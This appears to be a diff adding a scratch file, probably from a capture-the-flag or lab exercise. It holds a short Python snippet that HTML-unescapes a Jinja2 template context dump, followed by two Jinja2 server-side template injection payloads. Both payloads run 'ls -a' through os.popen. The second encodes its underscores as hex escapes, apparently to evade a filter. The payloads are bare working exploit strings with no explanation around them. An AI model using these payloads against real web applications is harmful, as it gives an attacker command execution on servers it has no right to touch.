@@ -1,0 +1,10 @@
+import html
+
+encoded_text = "{&#39;_TemplateReference__context&#39;: &lt;Context {&#39;range&#39;: &lt;class &#39;range&#39;&gt;}}"
+decoded_text = html.unescape(encoded_text)
+
+print(decoded_text)
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}}
+
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls -a')['read']()}}
